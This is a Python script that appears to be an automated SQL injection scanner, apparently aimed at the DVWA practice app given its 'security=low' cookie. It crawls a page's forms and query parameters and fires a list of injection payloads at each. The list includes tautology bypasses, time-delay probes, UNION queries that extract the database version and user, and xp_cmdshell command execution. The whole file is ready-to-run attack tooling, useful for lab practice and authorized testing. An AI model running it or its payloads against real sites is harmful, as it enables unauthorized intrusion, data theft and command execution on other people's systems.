import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qsl
import logging
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

# Session setup
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
session.headers["Cookie"] = "PHPSESSID=34b5af50db2e943348f0581af7f98498; security=low"

# Default SQLi payloads
sqli_payload_list = [
    "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", 
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "admin' --", "admin' #", 
    "admin'/*", "' OR '1'='1'{", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", 
    "1' WAITFOR DELAY '0:0:5'--", "1'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5) --",
    "' OR SLEEP(5) = '", "'; EXEC xp_cmdshell('whoami') --", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1, @@version --", "'; EXEC xp_cmdshell('calc.exe') --", 
    "' OR EXISTS(SELECT * FROM users) --", "' AND (SELECT COUNT(*) FROM users) > 0 --", 
    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 114 --", "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "'; WAITFOR DELAY '0:0:10' --", "' OR 'x'='x' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%') --", 
    "' OR 'x'='x' AND version() LIKE '% --", "' OR 'x'='x' AND MID(version(), 1, 1) = '5' --",
    "' AND 'x'='y' AND (SELECT LENGTH(version())) > 0 --", "' AND 1=2 UNION SELECT 1, version(), database() --",
    "' AND 1=2 UNION SELECT 1, user(), database() --", "1' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64) THEN 0x31 ELSE 0x30 END)) AND '1'='1",
    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--", 
    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,7 FROM sysobjects WHERE xtype = 'U' --",  
    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',table_name FROM INFORMATION_SCHEMA.TABLES WHERE 2>1--",  
    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE 2>1--",  
]

# SQLi error indicators
sqli_vuln_errors = [
    "you have an error in your sql syntax", "quoted string not properly sanitized",
    "unclosed quotation mark", "warning: mysql"
]

def get_forms(url):
    try:
        soup = BeautifulSoup(session.get(url).content, 'html.parser')
        return soup.find_all("form")
    except Exception:
        return []

def form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = [{"type": input_tag.attrs.get("type", "text"), 
                   "name": input_tag.attrs.get("name"), 
                   "value": input_tag.attrs.get("value", "")} 
                  for input_tag in form.find_all("input")]
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception:
        details["action"] = "#"
        details["method"] = "get"
        details["inputs"] = [{"type": "text", "name": "test", "value": ""}]
    return details

def submit_form(details, url, payload=""):
    try:
        target_url = urljoin(url, details["action"])
        data = {input_tag["name"]: input_tag["value"] + payload if input_tag["type"] != "submit" else input_tag["value"] 
                for input_tag in details["inputs"]}
        if details["method"] == "post":
            return session.post(target_url, data=data)
        else:
            return session.get(target_url, params=data)
    except Exception:
        return None

def sqli_vulnerable(response, baseline_response=None):
    if not response or response.status_code != 200:
        return False
    content = response.text.lower()

    # Check for known SQL errors
    error_found = any(error in content for error in sqli_vuln_errors)

    # Check if the content significantly differs from the baseline
    if baseline_response:
        baseline = baseline_response.text.lower()
        if len(baseline) != len(content):
            return True

    return error_found


def sqli_scan_url(url, payload):
    parsed_url = urlparse(url)
    modified_pairs = [(key, value + payload) for key, value in parse_qsl(parsed_url.query)]
    modified_query = "&".join([f"{key}={value}" for key, value in modified_pairs])
    modified_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
    
    try:
        response = session.get(modified_url)
        return response
    except Exception:
        return None

def sqli_scan(url):
    found_vulnerabilities = []

    # Generate a clean baseline response
    try:
        baseline_response = session.get(url)
    except:
        baseline_response = None

    # Test forms
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)

        # Submit a clean (no payload) request to this form to get baseline
        form_baseline = submit_form(details, url, payload="")

        for payload in sqli_payload_list:
            response = submit_form(details, url, payload)
            if sqli_vulnerable(response, baseline_response=form_baseline):
                found_vulnerabilities.append({
                    "status": "vulnerable",
                    "payload": payload,
                    "url": url,
                    "method": details["method"],
                    "parameter": "form input",
                    "evidence": response.text[:500]  # limit evidence length
                })
                break  # stop testing after first positive for this form

    # Test query parameters
    if "?" in url:
        for payload in sqli_payload_list:
            response = sqli_scan_url(url, payload)
            if sqli_vulnerable(response, baseline_response=baseline_response):
                found_vulnerabilities.append({
                    "status": "vulnerable",
                    "payload": payload,
                    "url": url,
                    "parameter": "query parameter",
                    "evidence": response.text[:500]
                })
                break  # stop testing after first positive

    return found_vulnerabilities if found_vulnerabilities else [{"status": "not vulnerable"}]


if __name__ == "__main__":
    try:
        base_url = sys.argv[1]
        result = sqli_scan(base_url)
        clean_result = [{
    "status": vuln.get("status", "unknown"),
    "payload": vuln.get("payload", ""),
    "url": vuln.get("url", ""),
    "method": vuln.get("method", ""),
    "parameter": vuln.get("parameter", ""),
    "evidence": vuln.get("evidence", "")
} for vuln in result]

        print(json.dumps(clean_result, indent=4))
    except Exception as e:
        print(json.dumps({"error": str(e)}))
